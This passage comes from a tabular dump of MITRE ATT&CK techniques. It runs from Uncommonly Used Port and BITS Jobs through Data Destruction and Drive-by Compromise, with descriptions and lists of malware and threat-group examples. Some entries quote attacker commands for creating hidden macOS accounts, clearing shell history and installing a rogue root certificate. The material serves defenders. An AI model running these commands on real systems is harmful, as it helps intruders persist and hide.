traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.  For attacks attempting to saturate the providing network, see [Network Denial of Service] ","['[OnionDuke] has the capability to use a Denial of Service module.', '[Sandworm Team] temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.', '[ZxShell] has a feature to perform SYN flood attack on a host. ']",False
T1065,Uncommonly Used Port,Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.,"['[Group5] C2 servers communicated with malware over TCP 8081, 8282, and 8083.', 'Some [Volgmer] variants use port 8088 for C2.', '[PoisonIvy] opens a backdoor on TCP ports 6868 and 7777.', '[TrickBot] uses ports 447 and 8082 for C2 communications.', '[TEMP.Veles] has used ports 4444, 8531, and 50501 for C2.', '[Cannon] uses port 587 for C2.', '[Magic Hound] malware has communicated with its C2 server over ports 4443 and 3543.', '[InnaputRAT] uses port 52100 and 5876 for C2 communications.', '[ZxShell] uses ports 1985 and 1986 for communication. ', '[RedLeaves] can use port 995 for C2.', '[POWERSTATS] has used ports 8060 and 8888 for C2.', 'A [TYPEFRAME] variant can use port 127 for communications.', '[APT33] has used ports 808 and 880 for command and control.', '[CoinTicker] establishes outbound connections for command and control on ports 2280 and 1339.', '[Revenge RAT] has communicated over TCP port 3333.', 'Some [Lazarus Group] malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes uncommonly used ports such as 995, 1816, 465, 1521, 3306, and many others.', 'A [Remsec] module has a default C2 port of 13000.', '[GravityRAT] uses port 46769 for C2.', '[njRAT] has been observed communicating over uncommon TCP ports, including 1177 and 8282.', '[Emotet] has been observed communicating over non standard ports, including 7080 and 50000.', '[HiddenWasp] uses port 61061 to communicate with the C2 server.', '[HOPLIGHT] has used uncommon TCP ""high port"" to ""high port"" communication.\t', '[Gorgon Group] has used a variant of [ShiftyBug] that communicates with its C2 server over port 6666.', '[Bankshot] binds and listens on port 1058.', '[Zebrocy] uses port 465 for C2.', '[MobileOrder] communicates with its C2 server over TCP port 3728.', '[Agent Tesla] has enabled TCP on port 587 for C2 communications.', 'An [APT3] downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81.', '[NanoCore] communicates to its C2 over ports 6666 and 4782.', '[APT32] backdoor can use HTTP over an uncommon TCP port (e.g 14146) which is specified in the backdoor configuration.', 'opens a backdoor on TCP ports 6868 and 7777.']",True
T1614,System Location Discovery," Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host. In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.  Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.","['[DarkWatchman] can identity the OS locale of a compromised host.', '[SideCopy] has identified the country location of a compromised host.', '[DarkGate] queries system locale information during execution. Later versions of [DarkGate] query <code>GetSystemDefaultLCID</code> for locale information to determine if the malware is executing in Russian-speaking countries.', '[SocGholish] can use IP-based geolocation to limit infections to victims in North America, Europe, and a small number of Asian-Pacific nations.', '[QuasarRAT] can determine the country a victim host is located in.', '[SDBbot] can collected the country code of a compromised machine.', ""Before executing malicious code, [Ragnar Locker] checks the Windows API <code>GetLocaleInfoW</code> and doesn't encrypt files if it finds a former Soviet country."", '[Crimson] can identify the geographical location of a victim host.\t ', '[Saint Bot] has conducted system locale checks to see if the compromised host is in Russia, Ukraine, Belarus, Armenia, Kazakhstan, or Moldova.', '[GrimAgent] can identify the country code on a compromised host.', '[Amadey] does not run any tasks or install additional malware if the victim machine is based in Russia.']",
T1197,BITS Jobs,"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model] (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.  The interface to create and manage BITS jobs is accessible through [PowerShell] and the [BITSAdmin] tool.  Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer] execute, and even clean up after running malicious code (e.g. [Indicator Removal] BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).  BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol]","['[MarkiRAT] can use BITS Utility to connect with the C2 server.', '[Patchwork] has used BITS jobs to download malicious payloads.', '[Bazar] has been downloaded via Windows BITS functionality.', '[Cobalt Strike] can download a hosted ""beacon"" payload using [BITSAdmin]', '[Egregor] has used BITSadmin to download and execute malicious DLLs.', 'A [JPIN] variant downloads the backdoor payload via the BITS service.', '[UBoatRAT] takes advantage of the /SetNotifyCmdLine option in [BITSAdmin] to ensure it stays running on a system to maintain persistence.', '[ProLock] can use BITS jobs to download its malicious payload.', '[Leviathan] has used [BITSAdmin] to download additional tools.', '[APT39] has used the BITS protocol to exfiltrate stolen data from a compromised host.', '[BITSAdmin] can be used to create [BITS Jobs] to launch a malicious process.', '[APT41] used [BITSAdmin] to download and install payloads.', '[Wizard Spider] has used batch scripts that utilizes WMIC to execute a [BITSAdmin] transfer of a ransomware payload to each compromised machine. ', '[Cobalt Strike] can download a hosted ""beacon"" payload using [BITSAdmin]', '[Tropic Trooper] has leveraged the BITSadmin command-line tool to create a job and launch a malicious process.']",False
T1656,Impersonation,"Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information] [Phishing] or [Internal Spearphishing] while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims.    In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft]  Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.      Impersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information] and [Gather Victim Org Information] as well as acquiring infrastructure such as email domains (i.e. [Domains] to substantiate their false identity.   There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts] targeting one organization which can then be used to support impersonation against other entities.","[""[LAPSUS$] has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts."", 'During [Operation Dream Job] [Lazarus Group] impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.', 'During [C0027] [Scattered Spider] impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.', 'During [C0027] [Scattered Spider] impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.  [Scattered Spider] utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.']",False
T1088,Bypass User Account Control,"Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.   If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box.   An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.  Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.  Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods  that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:  * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.    Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. ",[],True
T1494,Runtime Data Manipulation,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.   Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association] and [Masquerading] to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",[],True
T1493,Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.   Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",[],True
T1132,Data Encoding,"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some data encoding systems may also result in data compression, such as gzip.","['After encrypting C2 data, [BADNEWS] converts it into a hexadecimal representation and then encodes it into base64.', '[Mythic] provides various transform functions to encode and/or randomize C2 data.\t', '[Ursnif] has used encoded data in HTTP URLs for C2.\t', '[Linux Rabbit] sends the payload from the C2 server as an encoded URL parameter. ', '[H1N1] obfuscates C2 traffic with an altered version of base64.']",False
T1598,Phishing for Information,"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing] in that the objective is gathering data from the victim rather than executing malicious code.  All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.  Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means. Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.  Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts] or [Compromise Accounts] and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools.   Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules]","['[Scattered Spider] has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes.', '[ZIRCONIUM] targeted presidential campaign staffers with credential phishing e-mails.', '[APT28] has used spearphishing to compromise credentials.']",False
T1496,Resource Hijacking,"Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.   One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.  Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.  Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service] campaigns and/or to seed malicious torrents. Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.","['[Lucifer] can use system resources to mine cryptocurrency, dropping XMRig to mine Monero.', '[Skidmap] is a kernel-mode rootkit used for cryptocurrency mining.', '[CookieMiner] has loaded coinmining software onto systems to mine for Koto cryptocurrency. ', '[Rocke] has distributed cryptomining malware.', '[Bonadan] can download an additional module which has a cryptocurrency mining extension.', '[LoudMiner] harvested system resources to mine cryptocurrency, using XMRig to mine Monero.\t', '[DarkGate] can deploy follow-on cryptocurrency mining payloads.', '[Blue Mockingbird] has used XMRIG to mine cryptocurrency on victim systems.', '[Imminent Monitor] has the capability to run a cryptocurrency miner on the victim machine.', '[TeamTNT] has deployed XMRig Docker images to mine cryptocurrency. [TeamTNT] has also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency.', '[APT41] deployed a Monero cryptocurrency mining tool in a victim’s environment.', '[Hildegard] has used xmrig to mine cryptocurrency.', '[Kinsing] has created and run a Bitcoin cryptocurrency miner.', '[Lazarus Group] has subset groups like Bluenoroff who have used cryptocurrency mining software on victim machines.']",False
T1585,Establish Accounts,"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.  For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.  Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information] or [Phishing] In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure] for malicious purposes. ","['[Fox Kitten] has created KeyBase accounts to communicate with ransomware victims.', '[APT17] has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, [APT17] has created biographical sections and posted in forum threads.']",False
T1588,Obtain Capabilities,"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.  In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.  In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.",[],
T1147,Hidden Users,"Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [Create Account] technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> .",[],True
T1500,Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information] text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.  Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment] Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework. ",[],True
T1569,System Services,"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process] but adversaries can also abuse services for one-time or temporary execution.",['[TeamTNT] has created system services to execute cryptocurrency mining software.'],
T1223,Compiled HTML File,"Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe).   Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution] CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe.  ",[],True
T1650,Acquire Access,"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems. In some cases, adversary groups may form partnerships to share compromised systems with each other.  Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell] or established access via [External Remote Services] In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers.  By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.  In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship] [Multi-Factor Authentication Interception] or even [Supply Chain Compromise]  **Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data] and [Credentials] they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts]",[],False
T1213,Data from Information Repositories,"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.   The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:  * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials * Work / project schedules * Source code snippets * Links to network shares and other internal resources  Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint] and [Confluence] specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.","['[Sandworm Team] exfiltrates data of interest from enterprise databases using Adminer.', '[FIN6] has collected schemas and user accounts from systems running SQL Server.', ""During the [SolarWinds Compromise] [APT29] accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations."", '[Fox Kitten] has accessed victim security and IT environments and Microsoft Teams to mine valuable information.', '[APT28] has collected files from various information repositories.', ""[Turla] has used a custom .NET tool to collect documents from an organization's internal central database."", ""[LAPSUS$] has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials."", '[P.A.S. Webshell] has the ability to list and extract data from SQL databases.', '[APT29] has accessed victims’ internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.']",False
T1146,Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. macOS and Linux both keep track of the commands users type in their terminal so that users can retrace what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>.",[],True
T1519,Emond,"Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon] that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon] configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.  Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon] service.",[],True
T1194,Spearphishing via Service,"Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.  A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",['[Magic Hound] used various social media channels to spearphish victims.'],True
T1200,Hardware Additions,"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media] more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.  While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle] keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.","['[DarkVishnya] used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company’s local network.']",False
T1505,Server Software Component,Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.,[],False
T1485,Data Destruction,"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe] and [Disk Structure Wipe] because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.  Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.  To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts] [OS Credential Dumping] and [SMB/Windows Admin Shares]  In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.","['[Diavol] can delete specified files from a targeted system.', '[WhisperGate] can corrupt files by overwriting the first 1 MB with `0xcc` and appending random extensions.', '[Industroyer] data wiper module clears registry keys and overwrites both ICS configuration and Windows files.', ""[LAPSUS$] has deleted the target's systems and resources both on-premises and in the cloud."", '[Xbash] has destroyed Linux-based databases as part of its ransomware capabilities.\t', '[Lazarus Group] has used a custom secure delete function to overwrite file contents with data from heap memory.', '[AcidRain] performs an in-depth wipe of the target filesystem and various attached storage devices through either a data overwrite or calling various IOCTLS to erase it.', '[REvil] has the capability to destroy files and folders.', '[Kazuar] can overwrite files with random data before deleting them.', '[HermeticWiper] can recursively wipe folders and files in `Windows`, `Program Files`, `Program Files(x86)`, `PerfLogs`, `Boot, System`, `Volume Information`, and `AppData` folders using `FSCTL_MOVE_FILE`. [HermeticWiper] can also overwrite symbolic links and big files in `My Documents` and on the Desktop with random bytes.', '[Shamoon] attempts to overwrite operating system files and disk structures with image files. In a later variant, randomly generated data was used for data overwrites.', '[PowerDuke] has a command to write random data across a file and delete it.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] deployed [CaddyWiper] on the victim’s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions.', '[Olympic Destroyer] overwrites files locally and on remote shares. ', '[APT38] has used a custom secure delete function to make deleted files unrecoverable.', ""[Gamaredon Group] has used tools to delete files and folders from victims' desktops and profiles."", '[CaddyWiper] can work alphabetically through drives on a compromised system to take ownership of and overwrite all files.', '[SDelete] deletes data in a way that makes it unrecoverable.', '[BlackEnergy] 2 contains a ""Destroy"" plug-in that destroys data stored on victim hard drives by overwriting file contents.', '[RawDisk] was used in [Shamoon] to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.', ""[Meteor] can fill a victim's files and directories with zero-bytes in replacement of real content before deleting them."", '[KillDisk] deletes system files to make the OS unbootable. [KillDisk] also targets and deletes files with 35 different file extensions.', '[Sandworm Team] has used the [BlackEnergy] KillDisk component to overwrite files on Windows-based Human-Machine Interfaces. ', '[Proxysvc] can overwrite files indicated by the attacker before deleting them.', '[StoneDrill] has a disk wiper module that targets files other than those in the Windows directory.']",False
T1537,Transfer Data to Cloud Account,"Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.  A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.  Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.  Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts. ",[],False
T1130,Install Root Certificate,"Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.  Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.  Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.   Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications.   Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.   In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. ",[],True
T1022,Data Encrypted,"Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.  Other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel] and [Exfiltration Over Alternative Protocol]","['Modules can be pushed to and executed by [Duqu] that copy data to a staging area, compress it, and XOR encrypt it.', 'After collecting files and logs from the victim, [Prikormka] encrypts some collected data with Blowfish.', '[Honeybee] adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.', '[APT32] backdoors have encrypted data before exfiltration, including by using RC4 encryption.', '[BRONZE BUTLER] has compressed and encrypted data into password-protected RAR archives prior to exfiltration.']",True
T1189,Drive-by Compromise,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token]  Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target] including:  * A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting * Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary * Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising] * Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).  Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.  Typical drive-by compromise process:  1. A user visits a website that is used to host the adversary controlled content. 2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.      * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes. 3. Upon finding a vulnerable version, exploit code is delivered to the browser. 4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.     * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.  Unlike [Exploit Public-Facing Application] the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.  Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token] like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.","['[Transparent Tribe] has used websites with malicious hyperlinks and iframes to infect targeted victims with [Crimson] [njRAT] and other malicious tools.', '[RTM] has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network <code>Yandex.Direct</code>.', '[PLATINUM] has sometimes used drive-by attacks against vulnerable browser plugins.', '[Windshift] has used compromised websites to register custom URL schemes on a remote system.', 